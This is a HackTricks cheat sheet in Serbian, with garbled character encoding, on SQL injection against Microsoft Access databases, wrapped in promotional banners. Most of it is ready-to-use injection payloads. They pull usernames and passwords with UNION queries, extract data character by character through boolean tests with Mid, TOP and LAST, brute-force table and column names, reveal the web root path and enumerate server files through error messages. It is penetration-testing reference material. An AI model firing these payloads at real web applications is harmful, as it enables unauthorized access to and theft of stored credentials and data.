# MS Access SQL Injection

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Online Playground

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## OgraniÄenja baze podataka

### Spajanje stringova

Spajanje stringova je moguÄ‡e koristeÄ‡i znakove `& (%26)` i `+ (%2b)`.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### Komentari

Nema komentara u MS Access-u, ali izgleda da je moguÄ‡e ukloniti poslednji deo upita pomoÄ‡u NULL karaktera:
```sql
1' union select 1,2 from table%00
```
Ako ovo ne radi, uvek moÅ¾ete popraviti sintaksu upita:
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Stacked Queries

Nisu podrÅ¾ane.

### LIMIT

Operator **`LIMIT`** **nije implementiran**. MeÄ‘utim, moguÄ‡e je ograniÄiti rezultate SELECT upita na **prvih N redova tabele koristeÄ‡i operator `TOP`**. `TOP` prihvata kao argument celobrojnu vrednost koja predstavlja broj redova koji Ä‡e biti vraÄ‡eni.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
BaÅ¡ kao i TOP, moÅ¾ete koristiti **`LAST`** koji Ä‡e dobiti **redove sa kraja**.

## UNION Upiti/ Podupiti

U SQLi-u obiÄno Å¾elite na neki naÄin izvrÅ¡iti novi upit kako biste izvukli informacije iz drugih tabela. MS Access uvek zahteva da se u **podupitima ili dodatnim upitima navede `FROM`**.\
Dakle, ako Å¾elite izvrÅ¡iti `UNION SELECT` ili `UNION ALL SELECT` ili `SELECT` izmeÄ‘u zagrada u uslovu, uvek **morate navesti `FROM` sa validnim imenom tabele**.\
Stoga, morate znati **validno ime tabele**.
```sql
-1' UNION SELECT username,password from users%00
```
### Spajanje jednakosti + Podstring

{% hint style="warning" %}
Ovo Ä‡e vam omoguÄ‡iti da izvuÄete vrednosti trenutne tabele bez potrebe da znate ime tabele.
{% endhint %}

**MS Access** dozvoljava **Äudnu sintaksu** kao Å¡to je **`'1'=2='3'='asd'=false`**. Kao i obiÄno, SQL injection Ä‡e biti unutar **`WHERE`** klauzule i to moÅ¾emo zloupotrebiti.

Zamislite da imate SQLi u MS Access bazi podataka i znate (ili ste pretpostavili) da je jedno **ime kolone username**, a to je polje koje Å¾elite **izvuÄ‡i**. MoÅ¾ete proveriti razliÄite odgovore veb aplikacije kada se koristi tehnika spajanja jednakosti i potencijalno izvuÄ‡i sadrÅ¾aj sa **boolean injection** koriÅ¡Ä‡enjem funkcije **`Mid`** za dobijanje podstringova.
```sql
'=(Mid(username,1,3)='adm')='
```
Ako znate **ime tabele** i **kolonu** koju Å¾elite da izvuÄete, moÅ¾ete koristiti kombinaciju funkcija `Mid`, `LAST` i `TOP` da **procurite sve informacije** putem boolean SQLi:
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Slobodno proverite ovo u online igraliÅ¡tu._

### Brute-forcing imena tabela

KoristeÄ‡i tehniku lanÄanog jednako, takoÄ‘e moÅ¾ete **bruteforceovati imena tabela** neÄim poput:
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
MoÅ¾ete koristiti i tradicionalniji naÄin:
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Slobodno proverite ovo u online igraonici._

* Sqlmap uobiÄajena imena tabela: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* Postoji joÅ¡ jedna lista na [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### Brute-Forcing imena kolona

MoÅ¾ete **brute-force trenutna imena kolona** pomoÄ‡u trika sa lancem jednakosti sa:
```sql
'=column_name='
```
Ili sa **group by** klauzulom:
```sql
-1' GROUP BY column_name%00
```
Ili moÅ¾ete izvrÅ¡iti brute-force napad na nazive kolona **druge tabele** pomoÄ‡u:
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Dumpovanje podataka

VeÄ‡ smo razgovarali o [**tehnici spajanja jednakosti**](ms-access-sql-injection.md#chaining-equals-+-substring) **za dumpovanje podataka iz trenutnih i drugih tabela**. Ali postoje i druge metode:
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
Ukratko, upit koristi "if-then" izjavu kako bi pokrenuo "200 OK" u sluÄaju uspeha ili "500 Internal Error" u suprotnom. IskoriÅ¡Ä‡avanjem operatora TOP 10, moguÄ‡e je izabrati prvih deset rezultata. Naknadna upotreba LAST omoguÄ‡ava razmatranje samo 10. tuple. Na takvoj vrednosti, koriÅ¡Ä‡enjem operatora MID, moguÄ‡e je izvrÅ¡iti jednostavno poreÄ‘enje karaktera. Pravilnom promenom indeksa MID i TOP, moÅ¾emo izvuÄ‡i sadrÅ¾aj polja "korisniÄko ime" za sve redove.

### Vremenski bazirano

Proverite [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### Ostale interesantne funkcije

* `Mid('admin',1,1)` dobija podstring sa pozicije 1 duÅ¾ine 1 (poÄetna pozicija je 1)
* `LEN('1234')` dobija duÅ¾inu stringa
* `ASC('A')` dobija ASCII vrednost karaktera
* `CHR(65)` dobija string iz ASCII vrednosti
* `IIF(1=1,'a','b')` ako onda
* `COUNT(*)` Broji broj stavki

## Enumeracija tabela

Odavde [**ovde**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) moÅ¾ete videti upit za dobijanje imena tabela:
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
MeÄ‘utim, imajte na umu da je vrlo tipiÄno pronaÄ‡i SQL Injection gde **nemate pristup Äitanju tabele `MSysObjects`**.

## Pristup datoteÄnom sistemu

### Puna putanja do web korenskog direktorijuma

Znanje o **apsolutnoj putanji do web korenskog direktorijuma moÅ¾e olakÅ¡ati dalje napade**. Ako greÅ¡ke aplikacije nisu potpuno sakrivene, putanja direktorijuma moÅ¾e biti otkrivena pokuÅ¡ajem selektovanja podataka iz nepostojeÄ‡e baze podataka.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access odgovara **porukom o greÅ¡ci koja sadrÅ¾i punu putanju do web direktorijuma**.

### Enumeracija datoteka

SledeÄ‡i vektor napada moÅ¾e se koristiti za **utvrÄ‘ivanje postojanja datoteke na udaljenom datoteÄnom sistemu**. Ako navedena datoteka postoji, MS Access pokreÄ‡e poruku o greÅ¡ci koja obaveÅ¡tava da je format baze podataka nevaÅ¾eÄ‡i:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

JoÅ¡ jedan naÄin za enumeraciju datoteka sastoji se u **navoÄ‘enju stavke baze podataka.tablica**. **Ako** navedena **datoteka postoji**, MS Access prikazuje **poruku o greÅ¡ci formata baze podataka**.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### PogaÄ‘anje imena .mdb datoteke

**Ime datoteke baze podataka (.mdb)** moÅ¾e se utvrditi pomoÄ‡u sledeÄ‡eg upita:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

Gde je **name\[i] ime .mdb datoteke** i **realTable postoji tabela** u bazi podataka. Iako Ä‡e MS Access uvek pokrenuti poruku o greÅ¡ci, moguÄ‡e je razlikovati izmeÄ‘u nevaÅ¾eÄ‡eg imena datoteke i vaÅ¾eÄ‡eg imena .mdb datoteke.

### .mdb Kradljivac lozinki

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) je besplatni alat koji se moÅ¾e koristiti za pronalaÅ¾enje glavne lozinke glavne baze podataka Microsoft Access 95/97/2000/XP ili Jet Database Engine 3.0/4.0.

## Reference

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **oglaÅ¡avanje vaÅ¡e kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
